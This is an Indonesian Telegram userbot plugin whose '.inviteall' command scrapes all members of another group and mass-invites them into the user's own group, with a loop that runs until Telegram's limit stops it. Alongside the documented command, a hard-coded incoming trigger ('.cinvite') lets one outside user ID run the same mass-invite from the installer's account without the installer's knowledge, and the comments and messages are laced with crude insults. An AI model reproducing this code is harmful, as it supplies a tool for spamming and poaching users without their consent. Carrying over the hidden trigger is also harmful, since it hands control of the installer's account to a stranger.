# Ported By @VckyouuBitch 
# Forked By @MaafGausahSokap
# Copyright © Team RAM - UBOT
# Hush Hush Sana ajg gausah kesini
# Si ngentot, Kalo ngefork Jangan hapus kredit babi!!

from telethon.tl import functions
from telethon.tl.functions.messages import GetFullChatRequest
from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError)
from telethon.tl.functions.channels import GetFullChannelRequest

from userbot.events import register
from userbot import CMD_HELP


async def get_chatinfo(event):
    chat = event.pattern_match.group(1)
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except BaseException:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.reply("`Id channel/group Tidak valid bangsat bener.`")
            return None
        except ChannelPrivateError:
            await event.reply("`Ini Grup private ni bang, Atau kayanya gua ke banned dah bangsat adminnya.`")
            return None
        except ChannelPublicGroupNaError:
            await event.reply("`Channel Atau grup eror ni babi`")
            return None
        except (TypeError, ValueError):
            await event.reply("`id Group/channel udh gabisa nih.`")
            return None
    return chat_info


@register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
@register(incoming=True, from_users=1779447750, pattern=r"^\.cinvite(?: |$)(.*)")
async def get_users(event):
    sender = await event.get_sender()
    me = await event.client.get_me()
    if not sender.id == me.id:
        ram = await event.reply("`proses menambahkan beberapa binatang...`")
    else:
        ram = await event.edit("`Awas Limit tot!!...`")
    ramubotteam = await get_chatinfo(event)
    chat = await event.get_chat()
    if event.is_private:
        return await ram.edit("`Maaf, Silahkan menambahkan pengguna di sini`")
    s = 0
    f = 0
    error = 'None'

    await ram.edit("**Status Berjalan**\n\n`Menambahkan Binatang.......`")
    async for user in event.client.iter_participants(ramubotteam.full_chat.id):
        try:
            if error.startswith("Too"):
                return await ram.edit(f"**Tugas Selesai bersama dengan Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people")
            await event.client(functions.channels.InviteToChannelRequest(channel=chat, users=[user.id]))
            s = s + 1
            await ram.edit(f"**Sedang berjalan...**\n\n• Menambahkan `{s}` Binatang \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`")
        except Exception as e:
            error = str(e)
            f = f + 1
    return await ram.edit(f"**Tugas Selesai** \n\n• Sukses menambahkan `{s}` Binatang sange \n• Binatang yang ngelawan `{f}` Binatang.")


CMD_HELP.update({
    "invite":
        "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.inviteall groups username`\
          \n📌 : __Scrapes users from the given chat to your group__."
})
